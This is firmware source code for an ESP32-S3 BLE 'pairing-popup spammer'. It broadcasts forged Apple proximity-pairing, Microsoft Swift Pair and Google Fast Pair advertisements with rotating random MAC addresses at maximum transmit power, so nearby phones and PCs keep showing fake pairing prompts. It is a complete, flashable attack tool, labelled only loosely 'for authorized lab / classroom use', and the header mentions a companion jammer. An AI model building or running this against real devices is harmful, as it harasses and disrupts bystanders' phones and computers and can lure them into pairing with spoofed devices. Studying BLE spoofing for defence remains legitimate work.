// The Jester — BLE pairing-popup spammer (separate firmware from the jammer).
//
// Floods crafted BLE advertising packets so nearby devices throw pairing
// notifications: Apple proximity pairing (AirPods cards), Microsoft Swift Pair
// (Windows), and Google Fast Pair (Android). Each advertisement uses a fresh
// random MAC so targets keep seeing "new" devices.
//
// This uses the ESP32-S3's own BLE radio (NimBLE) — the nRF24 modules are NOT
// involved. Build/flash with:  pio run -e ble_spam -t upload
//
// For authorized lab / classroom use.

#include <Arduino.h>
#include <NimBLEDevice.h>

// NimBLE host call to set the random advertising address (symbol lives in the
// compiled NimBLE lib; declare it here to avoid include-path juggling).
extern "C" int ble_hs_id_set_rnd(const uint8_t* rnd_addr);

namespace {
constexpr int8_t  kLedPin       = 48;     // onboard WS2812
constexpr uint32_t kAdvWindowMs = 40;     // air time per advertisement

NimBLEAdvertising* gAdvertising = nullptr;

// ---- Apple proximity pairing device models (2 bytes each) ----------------
const uint8_t kAppleModels[][2] = {
    {0x0E, 0x20},  // AirPods Pro
    {0x0A, 0x20},  // AirPods Max
    {0x0F, 0x20},  // AirPods (2nd gen)
    {0x13, 0x20},  // AirPods (3rd gen)
    {0x14, 0x20},  // AirPods Pro (2nd gen)
    {0x02, 0x20},  // AirPods
    {0x0B, 0x20},  // PowerBeats Pro
    {0x0C, 0x20},  // Beats Solo Pro
    {0x11, 0x20},  // Beats Studio Buds
    {0x16, 0x20},  // Beats Fit Pro
    {0x17, 0x20},  // Beats Studio3
    {0x12, 0x20},  // Beats Studio Pro
    {0x0D, 0x20},  // Beats Studio Buds+
};

// ---- Google Fast Pair model IDs (3 bytes each) ---------------------------
// Best-effort: registered model IDs trigger a named popup; unregistered ones
// may show a generic "device nearby" or nothing depending on the phone.
const uint8_t kFastPairModels[][3] = {
    {0xCD, 0x82, 0x56},
    {0x0E, 0x86, 0x6F},
    {0x92, 0xBB, 0xBD},
    {0x2D, 0x7A, 0x23},
    {0x82, 0x1F, 0x66},
};

const char* kSwiftPairNames[] = {
    "Jester-01", "Free-AirPods", "Pair-Me", "Mouse-9000", "Keyboard-X",
};

void setLed(uint8_t r, uint8_t g, uint8_t b) {
    neopixelWrite(kLedPin, r, g, b);
}

void freshRandomAddress() {
    uint8_t addr[6];
    for (uint8_t i = 0; i < 6; ++i) {
        addr[i] = static_cast<uint8_t>(esp_random() & 0xFF);
    }
    addr[5] |= 0xC0;  // top two bits set => static random address
    ble_hs_id_set_rnd(addr);
}

void advertiseRaw(uint8_t* payload, size_t len) {
    gAdvertising->stop();
    freshRandomAddress();

    NimBLEAdvertisementData advData;
    advData.addData(reinterpret_cast<char*>(payload), len);
    gAdvertising->setAdvertisementData(advData);

    gAdvertising->start();
    delay(kAdvWindowMs);
    gAdvertising->stop();
}

// Apple proximity pairing (AirPods-style popup card).
void spamApple() {
    const uint8_t* model = kAppleModels[esp_random() % (sizeof(kAppleModels) / 2)];

    uint8_t p[31];
    uint8_t i = 0;
    p[i++] = 0x1E;        // AD length (30)
    p[i++] = 0xFF;        // manufacturer specific data
    p[i++] = 0x4C;        // Apple, Inc.
    p[i++] = 0x00;
    p[i++] = 0x07;        // proximity pairing
    p[i++] = 0x19;        // payload length (25)
    p[i++] = 0x07;
    p[i++] = model[0];
    p[i++] = model[1];
    p[i++] = 0x55;        // status
    while (i < sizeof(p)) {
        p[i++] = static_cast<uint8_t>(esp_random() & 0xFF);  // battery/flags/auth (random)
    }
    advertiseRaw(p, sizeof(p));
    setLed(40, 40, 40);   // white-ish = Apple
}

// Microsoft Swift Pair (Windows pairing notification) — most reliable target.
void spamSwiftPair() {
    const char* name = kSwiftPairNames[esp_random() % (sizeof(kSwiftPairNames) / sizeof(kSwiftPairNames[0]))];
    const uint8_t nameLen = static_cast<uint8_t>(strlen(name));

    uint8_t p[32];
    uint8_t i = 0;
    p[i++] = static_cast<uint8_t>(6 + nameLen);  // AD length
    p[i++] = 0xFF;        // manufacturer specific data
    p[i++] = 0x06;        // Microsoft
    p[i++] = 0x00;
    p[i++] = 0x03;        // Microsoft Beacon ID
    p[i++] = 0x00;        // Beacon sub-scenario
    p[i++] = 0x80;        // reserved (RSSI byte)
    for (uint8_t n = 0; n < nameLen; ++n) {
        p[i++] = static_cast<uint8_t>(name[n]);
    }
    advertiseRaw(p, i);
    setLed(0, 0, 60);     // blue = Microsoft
}

// Google Fast Pair (Android nearby-device popup).
void spamFastPair() {
    const uint8_t* model = kFastPairModels[esp_random() % (sizeof(kFastPairModels) / 3)];

    uint8_t p[10];
    uint8_t i = 0;
    p[i++] = 0x02;        // flags AD length
    p[i++] = 0x01;        // flags type
    p[i++] = 0x06;        // LE General Discoverable + BR/EDR not supported
    p[i++] = 0x06;        // service-data AD length (1 type + 2 uuid + 3 model)
    p[i++] = 0x16;        // service data - 16-bit UUID
    p[i++] = 0x2C;        // Fast Pair UUID 0xFE2C (little-endian)
    p[i++] = 0xFE;
    p[i++] = model[0];
    p[i++] = model[1];
    p[i++] = model[2];
    advertiseRaw(p, i);
    setLed(0, 60, 0);     // green = Google
}
}  // namespace

void setup() {
    Serial.begin(921600);
    delay(800);
    Serial.println("\n\n===== THE JESTER / BLE PAIRING-POPUP SPAMMER =====");

    setLed(60, 0, 60);  // purple during init

    NimBLEDevice::init("");
    NimBLEDevice::setPower(ESP_PWR_LVL_P9);             // max TX power
    NimBLEDevice::setOwnAddrType(BLE_OWN_ADDR_RANDOM);  // use random addresses

    gAdvertising = NimBLEDevice::getAdvertising();
    gAdvertising->setScanResponse(false);

    Serial.println("[BLE] Spamming Apple / Swift Pair / Fast Pair. Random MAC per advert.");
}

void loop() {
    switch (esp_random() % 3) {
        case 0: spamApple();     break;
        case 1: spamSwiftPair(); break;
        default: spamFastPair(); break;
    }
}
